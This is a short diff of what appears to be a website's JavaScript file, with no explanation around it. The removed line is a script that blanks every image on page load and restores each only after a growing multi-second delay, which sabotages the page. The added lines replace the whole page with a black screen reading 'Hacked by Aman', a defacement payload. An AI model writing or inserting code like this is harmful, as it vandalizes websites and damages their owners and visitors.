@@ -1,1 +1,4 @@
-document.addEventListener("DOMContentLoaded", function () {const images = document.getElementsByTagName('img');for (let i = 0; i < images.length; i++) {const originalSrc = images[i].src;images[i].src = "";(function(img, src, delay) {setTimeout(function() {img.src = src;}, delay);})(images[i], originalSrc, i * 10000);}});
+ document.body.style.margin = "0";
+  document.body.style.height = "100vh";
+  document.body.style.background = "black";
+  document.body.innerHTML = '<div style="color: red; font-size: 48px; display: flex; justify-content: center; align-items: center; height: 100%; font-family: sans-serif;">Hacked by Aman</div>';
